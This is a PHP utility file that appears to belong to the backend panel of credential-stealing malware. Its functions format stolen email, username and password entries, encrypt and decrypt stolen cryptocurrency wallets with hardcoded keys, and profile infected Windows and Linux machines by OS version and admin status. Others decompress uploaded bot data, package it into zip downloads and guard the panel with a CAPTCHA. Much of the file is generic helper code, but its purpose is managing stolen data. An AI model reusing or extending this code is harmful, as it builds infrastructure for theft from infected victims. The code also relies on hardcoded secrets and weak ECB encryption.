<?php
	if(!defined('IN_LOKI')) die("File not found.");
	
	if (!function_exists('hex2bin'))
	{
		function hex2bin($hexstr)
		{
			$n = strlen($hexstr);
			$sbin = "";
			$i = 0;
			while($i < $n)
			{
				$a = substr($hexstr, $i, 2);
				$c = pack("H*",$a);
				if ($i==0)
					$sbin = $c;
				else
					$sbin .= $c;
				$i+=2;
			}
			
			return $sbin;
		}
	}

	function GetVersion($Vers)
	{
		$Len = strlen($Vers);
		if($Len == 1)
			return "0." . $Vers;
		
		$Array = str_split($Vers);
		
		
		return $Array[0] . "." . $Array[1];
	}

	function GetClientIP()
	{
		if(isset($_SERVER['X-Real-IP']))
			return $_SERVER['X-Real-IP'];

		if(isset($_SERVER['HTTP_X_REAL_IP']))
			return $_SERVER['HTTP_X_REAL_IP'];
		
		if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
			return $_SERVER['HTTP_X_FORWARDED_FOR'];
		
		return $_SERVER['REMOTE_ADDR'];
	}

	function EscapeFilter($Source)
	{
		return htmlspecialchars($Source, ENT_QUOTES);
	}

	function strstr_after($haystack, $needle, $case_insensitive = false)
	{
		$strpos = ($case_insensitive) ? 'stripos' : 'strpos';
		$pos 	= $strpos($haystack, $needle);
		if (is_int($pos))
			return substr($haystack, $pos + strlen($needle));

		return $pos;
	}
	
	function FixNonPrintable($Source)
	{
		return preg_replace('/[\x00-\x1F\x80-\xFF]/', '', $Source);
	}
	
function GetTMPDir()
{
    if(!file_exists (TEMP_))
    {
        if(mkdir(TEMP_, 0755, true))
            return TEMP_;
    }
    else
    {
        return TEMP_;
    }

    return sys_get_temp_dir();
}
function GetTempFile($Prefix = '')
{
    return tempnam (GetTMPDir(), $Prefix);
}



function DelFile($File)
{
    unlink ($File);
}

function SetDownloadHeader($FileName, $ContentType = 'text/plain')
{
    ob_clean();
    header("Pragma: public");
    header("Expires: 0");
    header("Pragma: no-cache");
    header("Cache-Control: no-store, no-cache, must-revalidate");
    header("Cache-Control: post-check=0, pre-check=0", FALSE);
    header("Cache-Control: private", FALSE);
    header("Content-Type: $ContentType");
    header("Content-Transfer-Encoding: binary");
    header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
    header("Content-Disposition: attachment; filename=\"".$FileName."\"" );
}

function GetText_($ID_, $Print = TRUE)
{
    if($Print)
        echo $GLOBALS['TextDB'][$GLOBALS['Lang']][$ID_];

    return $GLOBALS['TextDB'][$GLOBALS['Lang']][$ID_];
}

function FormatDatadl($Title, $DataType, $DataID, $Print = FALSE)
{
    return '<a href="'.$GLOBALS['LINK_Download'] . $DataType . '&id=' . $DataID . '">' . $Title . '</a>';
}

function FormatMail($Data)
{
	$JSON_ = json_decode(stripslashes ( $Data), TRUE);
	$Result = $JSON_['EM'] . "|" .  $JSON_['US'] . '|' . $JSON_['PW'];
	$JSON_ = NULL;
    return $Result;
}

function FormatIcon($DataClient, $Wallet = FALSE)
{
	$Client = '';
	$Pre = '';
	if($Wallet)
	{
		$Client = GetWalletClient($DataClient);
		$Pre = 'w';
	}
	else
		$Client = GetClient($DataClient);
	
	return '<img style="margin-top:-2px; margin-right:3px; vertical-align:middle;" src="'.INCLUDE_.'/style/icon/'.$Pre.$DataClient.'.ico" alt="" height="16" width="16">' . $Client;
}

function FormatShort($Text)
{
	if(strlen($Text) > 53)
	{
		return substr($Text, 0, 53) . " ...";
	}
	return $Text;
}

function ConvertData($Size)
{
    $Units = array('b','kb','mb','gb','tb','pb');
    return @round($Size/pow(1024, ($i = floor(log($Size, 1024)))), 2). ' ' . $Units[$i];
}
function GetMemoryUsage()
{
    return ConvertData(memory_get_usage(TRUE));
}
function isValidEmail($Email)
{
    return filter_var($Email, FILTER_VALIDATE_EMAIL) && preg_match('/@.+\./', $Email);
}
function Error_($Message, $Show)
{
    if ($Show)
    {
        print '<div class="error">'.'MESSAGE: '. $Message.'</div>';
    }
    die();
}

function GetCountryCode()
{
    include_once INCLUDE_.'/class/geoip/geoip.inc';
    $GI_ = geoip_open(INCLUDE_."/class/geoip/GeoIP.dat", GEOIP_STANDARD);

    $Country = geoip_country_code_by_addr($GI_, GetClientIP());

    geoip_close($GI_);

    return $Country ? $Country : "XX";
}

function GetCountryName($CountryCode)
{
    if($CountryCode == "XX" || !strlen($CountryCode))
        return "Unknown";

    $CountryCode = strtoupper($CountryCode);

    include_once INCLUDE_.'/class/geoip/geoip.inc';
    $GI_ = geoip_open(INCLUDE_."/class/geoip/GeoIP.dat", GEOIP_STANDARD);

    $CountryName = $GI_->GEOIP_COUNTRY_NAMES[$GI_->GEOIP_COUNTRY_CODE_TO_NUMBER[$CountryCode]];

    geoip_close($GI_);

    return strlen($CountryName) ? $CountryName : "Unknown";
}

//DATE
function LastHour($Hour = 1)
{
    return time() - ($Hour * 60 * 60);
}
function LastDay($Day = 1)
{
    return time() - ($Day * 24 * 60 * 60);
}
function LastWeek($Week = 1)
{
    return LastDay($Week * 7);
}

function NowDate($Format = NULL, $Time = NULL)
{
    if(!$Format)
        $Format = 'Y-m-d H:i:s';

    if(!$Time)
        $Time = time();

    return date($Format, $Time);
}

function Time2Date($Time = NULL)
{
    return date('Y-m-d H:i:s', $Time);
}
//DATE


function Percentage($Value, $Value2, $Precision)
{
    if($Value == 0 OR $Value2 == 0)
        return 0;

    return round(($Value / $Value2) * 100, $Precision);
}
		function calculate_time_span($date){
    $etime = time() - $date;
    if ($etime < 1)
    {
        return '0 seconds';
    }

    $a = array( 365 * 24 * 60 * 60  =>  'year',
                 30 * 24 * 60 * 60  =>  'month',
                      24 * 60 * 60  =>  'day',
                           60 * 60  =>  'hour',
                                60  =>  'minute',
                                 1  =>  'second'
                );
    $a_plural = array( 'year'   => 'y',
                       'month'  => 'm',
                       'day'    => 'd',
                       'hour'   => 'h',
                       'minute' => 'm',
                       'second' => 's'
                );

    foreach ($a as $secs => $str)
    {
        $d = $etime / $secs;
        if ($d >= 1)
        {
            $r = round($d);
            return $r . ' ' . ($r > 1 ? $a_plural[$str] : $str);
        }
    }

}
function GetWORD($Source)
{
    $Result = unpack("C*", $Source);
    if(isset($Result[1]))
        return $Result[1];

    return NULL;
}

function GetDWORD($Source)
{
    $Result = unpack("L", $Source);
    if(isset($Result[1]))
        return $Result[1];

    return NULL;
}

function MakeRandomString($Length = 10, $Alphabetic = FALSE)
{
    $Characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    if($Alphabetic)
        $Characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';

    $CharactersLength = strlen($Characters);
    $Result = '';

    for ($i = 0; $i < $Length; $i++)
    {
        $Result .= $Characters[rand(0, $CharactersLength - 1)];
    }

    return $Result;
}

function UnPackStream($Source, $SourceLen)
{
    //include_once 'inc/lib/aplib.lib.php';

    if (!$SourceLen)
        return '';

    $Result = '';
    $ResultLen = aP_depack($Source, $Result, $SourceLen);

    if ($ResultLen == $SourceLen)
        return $Result;
    else
        return $Source;
}

//HASH
function GetSaltedHash($Source, $Salt = "ENZREGqz1PPGRiTZPsAPMi") //pw, data
{
    return GetMD5Hash($Salt . $Source);
}

function GetMD5Hash($Source)
{
    return md5($Source);
}
//HASH

//WALLET
function EncryptWallet($Buffer, $Key = 'iPaBh17SIms')
{
    $Cipher = MCRYPT_RIJNDAEL_256;
    $Mode 	= MCRYPT_MODE_ECB;

    $Buffer = bzcompress($Buffer, 5);
    $Key 	= substr(md5($Key), 3, 16);
    $Result = mcrypt_encrypt($Cipher, $Key, $Buffer, $Mode, mcrypt_create_iv(mcrypt_get_iv_size( $Cipher,  $Mode), MCRYPT_RAND));

    return $Result;
}
function DecryptWallet($Buffer, $Key = 'iPaBh17SIms')
{
    $Cipher = MCRYPT_RIJNDAEL_256;
    $Mode 	= MCRYPT_MODE_ECB;

    $Key 	= substr(md5($Key), 3, 16);
    $Buffers = mcrypt_decrypt($Cipher, $Key, $Buffer, $Mode, mcrypt_create_iv(mcrypt_get_iv_size( $Cipher,  $Mode), MCRYPT_RAND));
    //$Result = rtrim($Buffer, "\0");

    return bzdecompress ($Buffers);
}
//WALLET

//ACCOUNT, WINDOWS
function GetAccountText($Index)
{
    if($Index == 0 OR $Index == 1)
        return 'User';

    if($Index == 2 OR $Index == 3)
        return 'Administrator';

    return 'Unknown';
}

function AccountElevated($Index)
{
    if($Index == 3 OR $Index == 1)
        return TRUE;

    return FALSE;
}

function GetAccountType($Admin, $Elevated)
{
    define ("ELEVATED_ADMIN", 	3);
    define ("SIMPLE_ADMIN", 	2);
    define ("ELEVATED_USER", 	1);
    define ("SIMPLE_USER", 		0);

    if($Admin == 0 && $Elevated == 0)
        return SIMPLE_USER;
    if($Admin == 0 && $Elevated == 1)
        return ELEVATED_USER;
    if($Admin == 1 && $Elevated == 0)
        return SIMPLE_ADMIN;
    if($Admin == 1 && $Elevated == 1)
        return ELEVATED_ADMIN;

    return "ERROR_ACCOUNT";
}

function GetOSText($ID_)
{
    $OS_ = array
           (
               0 => "Windows 2000",
               1 => "Windows XP",
               2 => "Windows Server 2003",
               3 => "Windows Server 2008",
               4 => "Windows Vista",
               5 => "Windows Server 2008 R2",
               6 => "Windows 7",
               7 => "Windows Server 2012",
               8 => "Windows 8",
               9 => "Windows Server 2012 R2",
               10 => "Windows 8.1",
               11 => "Windows 10",
			   12 => "Windows Server 2016",
			   
			   40 => "Ubuntu",
			   41 => "Debian",
			   42 => "CentOS",
			   43 => "Arch",
			   44 => "Linux Distro"
           );

    return isset($OS_[$ID_]) ? $OS_[$ID_] : "Unknown";
}

function GetOSType_($Major, $Minor, $Product, $Type)
{
    define ("VER_NT_WORKSTATION", 		1);
	
	define ("UNKNOWN_OS", 				-1);
    define ("WINDOWS_2000", 			0); //"Windows 2000"
    define ("WINDOWS_XP", 				1); //"Windows XP"
    define ("WINDOWS_SERVER_2003", 		2); //"Windows Server 2003"
    define ("WINDOWS_SERVER_2008", 		3); //"Windows Server 2008"
    define ("WINDOWS_VISTA", 			4); //"Windows Vista"
    define ("WINDOWS_SERVER_2008R2", 	5); //"Windows Server 2008 R2"
    define ("WINDOWS_7", 				6); //"Windows 7"
    define ("WINDOWS_SERVER_2012", 		7); //"Windows Server 2012"
    define ("WINDOWS_8", 				8); //"Windows 8"
    define ("WINDOWS_SERVER_2012R2", 	9); //"Windows Server 2012 R2"
    define ("WINDOWS_81", 				10); //"Windows 8.1"
    define ("WINDOWS_10", 				11); //"Windows 10"
	define ("WINDOWS_SERVER_2016", 		12); //"Windows Server 2016 Technical Preview"

	define ("UBUNTU", 					40);
	define ("DEBIAN", 					41);
	define ("CENTOS", 					42);
	define ("ARCH", 					43);
	define ("OTHER_LIN", 				44); //"Windows 10 Preview"
	
    if($Major == 10 /*&& $Minor == 0*/)
	{
		if($Product == VER_NT_WORKSTATION)
			return WINDOWS_10;
		
		return WINDOWS_SERVER_2016;
	}
	
    if($Major == 6 && $Minor == 3)
    {
        if($Product == VER_NT_WORKSTATION)
            return WINDOWS_81;
       
		return WINDOWS_SERVER_2012R2;
    }
	
    if($Major == 6 && $Minor == 2)
    {
        if($Product == VER_NT_WORKSTATION)
            return WINDOWS_8;
       
		return WINDOWS_SERVER_2012;
    }
	
    if($Major == 6 && $Minor == 1)
    {
        if($Product == VER_NT_WORKSTATION)
            return WINDOWS_7;
       
		return WINDOWS_SERVER_2008R2;
    }
	
    if($Major == 6 && $Minor == 0)
    {
        if($Product == VER_NT_WORKSTATION)
            return WINDOWS_VISTA;
       
		return WINDOWS_SERVER_2008;
    }
	
	if($Major == 5)
	{
		if($Minor == 0)
			return WINDOWS_2000;
		
		if($Minor == 1)
			return WINDOWS_XP;
		
		if($Minor == 2)
			return WINDOWS_SERVER_2003;
	}
	
	if($Major == 4) //*NIX
	{
		if($Minor == 0)
			return UBUNTU;
		if($Minor == 1)
			return DEBIAN;
		if($Minor == 2)
			return CENTOS;
		if($Minor == 3)
			return ARCH;
		
		return OTHER_LIN;
	}
	
    return UNKNOWN_OS;
}

function GetOSType($OS, $OSProduct) //old
{
    define ("VER_NT_WORKSTATION", 	1);
    define ("WINDOWS_2000", 			0); //Windows 2000
    define ("WINDOWS_XP", 				1); //"Windows XP"
    define ("WINDOWS_SERVER_2003", 		2); //"Windows Server 2003"
    define ("WINDOWS_SERVER_2008", 		3); //"Windows Server 2008"
    define ("WINDOWS_VISTA", 			4); //"Windows Vista"
    define ("WINDOWS_SERVER_2008R2", 	5); //"Windows Server 2008 R2"
    define ("WINDOWS_7", 				6); //"Windows 7"
    define ("WINDOWS_SERVER_2012", 		7); //"Windows Server 2012"
    define ("WINDOWS_8", 				8); //"Windows 8"
    define ("WINDOWS_SERVER_2012R2", 	9); //"Windows Server 2012 R2"
    define ("WINDOWS_81", 				10); //"Windows 8.1"
    define ("WINDOWS_10", 				11); //"Windows 10"
	define ("WINDOWS_10TP", 			12); //"Windows 10 Preview"

	define ("UBUNTU", 				20); //"Windows 10"
	define ("DEBIAN", 				21); //"Windows 10 Preview"
	define ("OTHER_LIN", 			24); //"Windows 10 Preview"
	
    if($OS == 10 || $OS == 100)
        return WINDOWS_10;
	
    if($OS == 63)
    {
        if($OSProduct == VER_NT_WORKSTATION)
            return WINDOWS_81;
        else
            return WINDOWS_SERVER_2012R2;
    }
    if($OS == 62)
    {
        if($OSProduct == VER_NT_WORKSTATION)
            return WINDOWS_8;
        else
            return WINDOWS_SERVER_2012;
    }
    if($OS == 61)
    {
        if($OSProduct == VER_NT_WORKSTATION)
            return WINDOWS_7;
        else
            return WINDOWS_SERVER_2008R2;
    }
    if($OS == 60)
    {
        if($OSProduct == VER_NT_WORKSTATION)
            return WINDOWS_VISTA;
        else
            return WINDOWS_SERVER_2008;
    }
    if($OS == 52)
        return WINDOWS_SERVER_2003;
		
    if($OS == 51)
        return WINDOWS_XP;
	
    if($OS == 50)
        return WINDOWS_2000;
	
    if($OS == 20)
        return UBUNTU;
	
	if($OS == 21)
        return DEBIAN;
	
	if($OS == 24)
		return OTHER_LIN;
	
    return -1;
}
//ACCOUNT, WINDOWS

//ZIP
function NewZipFile($File)
{
    $Zip = new ZipArchive;
    if ($Zip->open($File, ZipArchive::CREATE) === TRUE)
    {
        return $Zip;
    }

    return NULL;
}
function AddBufferToZip($Zip, $File, $Buffer, $Overwrite = FALSE)
{
    if(!$Overwrite)
    {
        if($Zip->locateName($File))
        {
            $Data = explode(".", $File);
            if(count($Data) > 1)
            {
                $File =  $Data[0] . "_" . MakeRandomString(5) . "." . $Data[1];
            }
            else
                $File .=  "_" . MakeRandomString(5);

            $Data = NULL;
        }
    }

    return $Zip->addFromString($File, $Buffer);
}
function SaveZip($Zip)
{
    return $Zip->close();
}

function AddFolderToZip($Zip, $Folder)
{
    return $Zip->addEmptyDir($Folder);
}
//ZIP

function Exit404($E404 = "File not found.")
{
    header("HTTP/1.0 404 Not Found");
    header("Status: 404 Not Found");
    $_SERVER['REDIRECT_STATUS'] = 404;
    die($E404);
}


function Pagination($TotalPages, $CurrentPageID, $PageLimit, $ActValue, $Action, $DataTable)
{
    echo '<nav><ul class="pagination pagination-sm">';

    if($TotalPages > 1)
    {
        //Back
        if($CurrentPageID > 1)
            echo '<li><a href="?' .$ActValue. "=" .$Action. "&pI=" .($CurrentPageID - 1). "&pL=" .$PageLimit. '">' .GetText_('http_page_back', FALSE). '</a></li>';
        else
            echo '<li class="disabled"><a href="#">' .GetText_('http_page_back', FALSE). '</a></li>';

        // First Page and ...
        if($CurrentPageID > 2)
        {
            echo '<li><a href="?' .$ActValue."=".$Action."&pI=1&pL=".$PageLimit.'">1</a></li>';
            if(1 != $CurrentPageID - 2)
                echo '<li class="disabled"><a href="#">...</a></li>';
        }

        //Pref -1
        if($CurrentPageID - 1 > 0)
            echo '<li><a href="?'.$ActValue."=".$Action."&pI=".($CurrentPageID - 1)."&pL=".$PageLimit.'">'.($CurrentPageID - 1).'</a></li>';

        //Current Page
        echo '<li class="disabled"><a href="#">'.$CurrentPageID.'</a></li>';

        //Next +1
        if($TotalPages > $CurrentPageID)
            echo '<li><a href="?'.$ActValue."=".$Action."&pI=".($CurrentPageID + 1)."&pL=".$PageLimit.'">'.($CurrentPageID + 1).'</a></li>';

        //... and Last Page
        if($TotalPages > ($CurrentPageID + 1) && $TotalPages > 3)
        {
            if($TotalPages != $CurrentPageID + 2)
                echo '<li class="disabled"><a href="#">...</a></li>';

            echo '<li><a href="?'.$ActValue."=".$Action."&pI=".$TotalPages."&pL=".$PageLimit.'">'.$TotalPages.'</a></li>';
        }

        //Next
        if($TotalPages > $CurrentPageID)
            echo '<li><a href="?'.$ActValue."=".$Action."&pI=".($CurrentPageID + 1)."&pL=".$PageLimit.'">' .GetText_('http_page_next', FALSE). '</a></li> ';
        else
            echo '<li class="disabled"><a href="#">' .GetText_('http_page_next', FALSE). '</a></li> ';
    }

    $Limitss = '<div class="btn-group dropup">
               <button type="button" class="btn btn-xs btn-default">'.$PageLimit.'</button>
               <button type="button" class="btn btn-xs btn-default dropdown-toggle" data-toggle="dropdown" aria-expanded="false"><span class="caret"></span></button>
               <ul class="dropdown-menu" role="menu">';

    foreach($GLOBALS['PageLimitDB'] as $Elements)
    {
        if($Elements == $PageLimit)
            $Limitss .= '<li class="active"><a href="?'.$ActValue."=".$Action."&pI=".$CurrentPageID."&pL=".$Elements.'">' .$Elements. '</a></li>';
        else
            $Limitss .= '<li><a href="?'.$ActValue."=".$Action."&pI=".$CurrentPageID."&pL=".$Elements.'">' .$Elements. '</a></li>';
    }

    $Limitss .= '  </ul>
                </div>
                <span> records per page</span>';


    print '</ul></nav><div style="padding-bottom:15px;">';
    if(isset($DataTable["NumOfTotal"]) && $DataTable["NumOfTotal"] > 0)
        echo GetText_('table_show', FALSE) . " " . ($CurrentPageID - 1) * $PageLimit . " ".GetText_('table_to', FALSE)." " . ($DataTable["NumOfData"] + ($CurrentPageID - 1) * $PageLimit) . " ".GetText_('table_of', FALSE)." " . $DataTable["NumOfTotal"] . " ".GetText_('table_entries', FALSE) .',   '.$Limitss;
   
//   print '   </div></div></div>';
}

function GetTableMenu($Data = array(), $ID_ = "table_menu") //array("LINK", "TITLE", TRUE);
{
    if($Data == NULL)
        return;

    $Cnt = sizeof($Data);
    if($Cnt < 1)
        return;

    $Result =
        '<div id="'.$ID_.'">
        <div class="form-inline" role="form">';

    $i = 0;
    while($Cnt > $i)
    {
        $Disabled = '';
        if($Data[$i][2])
            $Disabled = 'disabled';

        if(isset($Data[$i][3]) && $Data[$i][3] == 'INPUT')
            $Result .= '   <form method="POST" id="sf" style="display: none;" action="'.$Data[$i][1].'"> <input class="'.$Disabled.' input-sm form-control" name="'.$Data[$i][0].'" type="text">';
        else if(isset($Data[$i][3]) && $Data[$i][3] == 'MULTISELECT')
        {
            $Result .= '
                       <select name="sc[]" class="selectpicker" title="'.$Data[$i][1].'" multiple data-selected-text-format="count>15" data-live-search="true" multiple style="btn-sm" data-width="110">';

            foreach($Data[$i][0] as $Elements => $Keys)
            {
                $Result .= '<option value="'.$Elements.'">'.$Elements.'</option>';
            }

            $Result .= '</select> ';
        }
        else if(isset($Data[$i][3]) && $Data[$i][3] == 'MULTISELECTWALLET')
        {
            $Result .= '
                       <select name="sw[]" class="selectpicker" title="'.$Data[$i][1].'" multiple data-selected-text-format="count>15" data-live-search="true" multiple style="btn-sm" data-width="110px">';

            foreach($Data[$i][0] as $Elements => $Keys)
            {
                $Result .= '<option value="'.$Elements.'">'.$Keys.'</option>';
            }

            $Result .= '</select> ';
        }
        else if(isset($Data[$i][3]) && $Data[$i][3] == 'MULTISELECTWALLETO')
        {
            $Result .= '
                       <select name="so[]" class="selectpicker" title="'.$Data[$i][1].'" multiple data-selected-text-format="count>15" data-live-search="true" multiple style="btn-sm" data-width="110px">';

            foreach($Data[$i][0] as $Elements => $Keys)
            {
                $Result .= '<option value="'.$Elements.'">'.$Keys.'</option>';
            }

            $Result .= '</select> ';
        }
        else if(isset($Data[$i][3]) && $Data[$i][3] == 'FORMEND')
        {
            $Result .= '<button type="submit" class="btn-sm btn btn-default">'.$Data[$i][1].'</button></form>';
        }
        else if($Data[$i][0] == "onvisible")
        {
            $Result .= '<a class="btn btn-sm btn-default ' . $Disabled . '" type="button" href="#" onclick="SetVisibility(\'sf\');">'.$Data[$i][1].'</a> ';
        }
        else if($Data[$i] == NULL)
        {

        }
        else if($Data[$i][0] == "text")
        {
            $Result .= '<h5>'.$Data[$i][1].'</h5> ';
        }
        else
		{
			if(isset($Data[$i][3]) && $Data[$i][3] == "CONFIRM")
				$Result .= '<a class="btn btn-sm btn-default ' . $Disabled . '" onclick="return Check(this);" type="button" href="'.$Data[$i][0].'">'.$Data[$i][1].'</a> ';
			else
			$Result .= '<a class="btn btn-sm btn-default ' . $Disabled . '" type="button" href="'.$Data[$i][0].'">'.$Data[$i][1].'</a> ';
		}
            

        $i++;
    }

    $Result .=
        '	</div>
        </div>';

    echo $Result;
}

function myErrorHandler($errno, $errstr, $errfile, $errline)
{

    /* if (!(error_reporting() & $errno)) {
    	 // This error code is not included in error_reporting
    	 return;
     }*/
    //ob_clean();
    switch ($errno)
    {
    case E_USER_ERROR:
        echo "<b>My ERROR</b> [$errno] $errstr<br />\n";
        echo "  Fatal error on line $errline in file $errfile";
        echo ", PHP " . PHP_VERSION . " (" . PHP_OS . ")<br />\n";
        echo "Aborting...<br />\n";
        exit(1);
        break;

    case E_USER_WARNING:
        echo "<b>My WARNING</b> [$errno] $errstr<br />\n";
        break;

    case E_USER_NOTICE:
        echo "<b>My NOTICE</b> [$errno] $errstr<br />\n";
        break;

    default:
        echo "Unknown error type: [$errno] $errstr<br />\n";
        break;
    }

    /* Don't execute PHP internal error handler */
    return true;
}

class APDSTATE
{

    public $source;
    public $src_offset = 0;
    public $destination;
    public $dst_offset = 0;
    public $tag;
    public $bitcount;

}
function aP_getbit(&$ud) // ok
{
    if (!$ud->bitcount--)
    {
        $ud->tag = ord($ud->source[$ud->src_offset++]);
        $ud->bitcount = 7;
    }

    $bit = ($ud->tag >> 7) & 0x01;
    $ud->tag = $ud->tag << 1;

    return $bit;
}

function aP_getgamma(&$ud) //ok
{
    $result = 1;
    do
    {
        $result = ($result << 1) + aP_getbit($ud);
    }
    while (aP_getbit($ud));
    return $result;
}

function aP_depack($source, &$dest)
{
	$olderror = error_reporting(0);
    $ud = new APDSTATE();

    $R0 = 0;
    $LWM = 0;
    $done = 0;

    $ud->source = $source;
    $ud->destination = &$dest;
    $ud->bitcount = 0;

    $ud->destination .= $ud->source[$ud->src_offset++];
    $ud->dst_offset++;
    while (!$done)
    {
        if (aP_getbit($ud))
        {
            if (aP_getbit($ud))
            {
                if (aP_getbit($ud))
                {
                    $offs = 0;
                    for ($i = 4; $i; $i--)
                        $offs = ($offs << 1) + aP_getbit($ud);

                    if ($offs)
                    {
                        $ud->destination .= $ud->destination[$ud->dst_offset - $offs];
                        $ud->dst_offset++;

                    }
                    else
                    {
                        $ud->destination[$ud->dst_offset++] = chr(0);
                    }
                    $LWM = 0;
                }
                else
                {
                    $offs = ord($ud->source[$ud->src_offset++]);

                    $len = 2 + ($offs & 0x0001);

                    $offs = $offs >> 1;

                    if ($offs)
                    {
                        while ($len--)
                        {
                            $ud->destination .= $ud->destination[$ud->dst_offset - $offs];
                            $ud->dst_offset++;
                        }
                    }
                    else
                        $done = 1;

                    $R0 = $offs;
                    $LWM = 1;
                }
            }
            else
            {
                $offs = aP_getgamma($ud);

                if (($LWM == 0) && ($offs == 2))
                {
                    $offs = $R0;

                    $len = aP_getgamma($ud);

                    while ($len--)
                    {
                        $ud->destination .= $ud->destination[$ud->dst_offset - $offs];
                        $ud->dst_offset++;
                    }
                }
                else
                {
                    if ($LWM == 0)
                        $offs -= 3;
                    else
                        $offs -= 2;

                    $offs = $offs << 8;
                    $offs += ord($ud->source[$ud->src_offset++]);

                    $len = aP_getgamma($ud);

                    if ($offs >= 32000)
                        $len++;
                    if ($offs >= 1280)
                        $len++;
                    if ($offs < 128)
                        $len += 2;

                    while ($len--)
                    {
                        $ud->destination .= $ud->destination[$ud->dst_offset - $offs];
                        $ud->dst_offset++;
                    }
                    $R0 = $offs;
                }
                $LWM = 1;
            }
        }
        else
        {
            $ud->destination .= $ud->source[$ud->src_offset++];
            $ud->dst_offset++;
            $LWM = 0;
        }
    }

	error_reporting($olderror);
    return $ud->dst_offset;
}

function die_()
{
    die();
}


if( !function_exists('hex2rgb') )
{
    function hex2rgb($hex_str, $return_string = false, $separator = ',')
    {
        $hex_str = preg_replace("/[^0-9A-Fa-f]/", '', $hex_str); // Gets a proper hex string
        $rgb_array = array();
        if(strlen($hex_str) == 6)
        {
            $color_val = hexdec($hex_str);
            $rgb_array['r'] = 0xFF & ($color_val >> 0x10);
            $rgb_array['g'] = 0xFF & ($color_val >> 0x8);
            $rgb_array['b'] = 0xFF & $color_val;
        }
        elseif(strlen($hex_str) == 3 )
        {
            $rgb_array['r'] = hexdec(str_repeat(substr($hex_str, 0, 1), 2));
            $rgb_array['g'] = hexdec(str_repeat(substr($hex_str, 1, 1), 2));
            $rgb_array['b'] = hexdec(str_repeat(substr($hex_str, 2, 1), 2));
        }
        else
        {
            return false;
        }
        return $return_string ? implode($separator, $rgb_array) : $rgb_array;
    }
}

function GetRandomFile($Dir = 'backgrounds/', $Type = '.png')
{
    $Backgrounds = array();
    $DHandle = opendir($Dir);
    while (false !== ($File = readdir($DHandle)))
    {
        if(strstr($File, $Type))
        {
            $Backgrounds[] = $File;
        }
    }

    $Result = $Dir . $Backgrounds[rand(0, count($Backgrounds) - 1)];
    unset($Backgrounds);
    return $Result;
}

function CheckCode($Code /*FORM Input*/, $Encrypted)
{
    if(strtolower(trim($Code)) == strtolower(trim(DecryptCaptcha($Encrypted))))
    {
        return TRUE;
    }

    return FALSE;
}

function EncryptCaptcha($Value, $SecretKey = "K3R+wfja")
{
    $Cipher = MCRYPT_RIJNDAEL_256;
    $Mode 	= MCRYPT_MODE_ECB;
    return rtrim(
               base64_encode(
                   mcrypt_encrypt($Cipher, GetCaptchaKey($SecretKey), $Value, $Mode,
                                  mcrypt_create_iv(mcrypt_get_iv_size( $Cipher, $Mode ), MCRYPT_RAND) ) ), "\0" );
}

function DecryptCaptcha($Value, $SecretKey = "K3R+wfja")
{
    $Cipher = MCRYPT_RIJNDAEL_256;
    $Mode 	= MCRYPT_MODE_ECB;
    return rtrim(mcrypt_decrypt($Cipher, GetCaptchaKey($SecretKey), base64_decode($Value), $Mode,
                                mcrypt_create_iv( mcrypt_get_iv_size( $Cipher, $Mode ), MCRYPT_RAND )), "\0");
}

function GetCaptchaKey($Key)
{
    return substr(md5($_SERVER['REMOTE_ADDR'] . $Key . date("Y-m-d H")), 3, 16);
}

function GetCaptcha()
{
    srand(microtime() * 100);
    $Background = GetRandomFile(INCLUDE_.'/style/Captcha/backgrounds/', '.png');
    $Font 		= GetRandomFile(INCLUDE_.'/style/Captcha/fonts/', '.ttf');
    //print $Font . "\n<br/>";

    $FontSize 	= array('Min' => 28, 'Max' => 28);
    $FontSize_  = rand($FontSize['Min'], $FontSize['Max']);

    $Code 		= '';
    $CodeLenght = array('Min' => 5, 'Max' => 6);
    $Characters = 'ABCDEFGHJKLMNPRSTUVWXYZabcdefghjkmnprstuvwxyz0123456789';

    $Angle_ 	= array('Min' => 0, 'Max' => 10);
    $Angle  	= rand($Angle_['Min'], $Angle_['Max']) * (rand(0, 1) == 1 ? -1 : 1);

    $Color_ 	= array('#666'/*, '#006600', '#0099FF'*/);
    $Color 		= hex2rgb($Color_[rand(0, count($Color_) - 1)]);

    $Shadow_ 	= array('Shadow' => TRUE, 'ShadowColor' => '#fff', 'ShadowX' => -1, 'ShadowY' => 1);
    $Line_ 		= array('Line' => TRUE, 'Color' => array('#FFFFFF', '#000000', '#666'/*, '#006600', '#0099FF'*/), 'Intensity' => 22, 'Min' => 1, 'Max' => 300);
    $Line2_ 	= array('Line2' => FALSE, 'Color' => array('#FFFFFF', '#000000', '#666'/*, '#006600', '#0099FF'*/), 'Intensity' => 2);
    $Dots_ 		= array('Dots' => TRUE, 'Color' => array('#FFFFFF', '#000000', '#666', '#006600', '#0099FF'), 'Intensity' => 1000, 'X' => 400, 'Y' => 150);

    // Init random string
    $Length = rand($CodeLenght['Min'], $CodeLenght['Max']);
    while(strlen($Code) < $Length)
        $Code .= substr($Characters, rand() % (strlen($Characters)), 1);

    // Init background
    list($bg_width, $bg_height, $bg_type, $bg_attr) = getimagesize($Background);
    $CaptchaIMG = imagecreatefrompng($Background);

    $Color = imagecolorallocate($CaptchaIMG, $Color['r'], $Color['g'], $Color['b']);

    $text_box_size = imagettfbbox($FontSize_, $Angle, $Font, $Code);
    $box_height = abs($text_box_size[5] - $text_box_size[1]);
    $text_pos_x = rand(0, ($bg_width) - (abs($text_box_size[6] - $text_box_size[2])));
    $text_pos_y = rand($box_height, ($bg_height) - ($box_height / 2));

    // Draw shadow
    if($Shadow_['Shadow'] )
    {
        $ShadowColor = hex2rgb($Shadow_['ShadowColor']);
        $ShadowColor = imagecolorallocate($CaptchaIMG, $ShadowColor['r'], $ShadowColor['g'], $ShadowColor['b']);
        imagettftext($CaptchaIMG, $FontSize_, $Angle, $text_pos_x + $Shadow_['ShadowX'], $text_pos_y + $Shadow_['ShadowY'], $ShadowColor, $Font, $Code);
    }

    // Draw text
    imagettftext($CaptchaIMG, $FontSize_, $Angle, $text_pos_x, $text_pos_y, $Color, $Font, $Code);

    if($Line_['Line'])
    {
        $Colors = array();
        foreach($Line_['Color'] as $Key => $Value)
        {
            $LineColor = hex2rgb($Value);
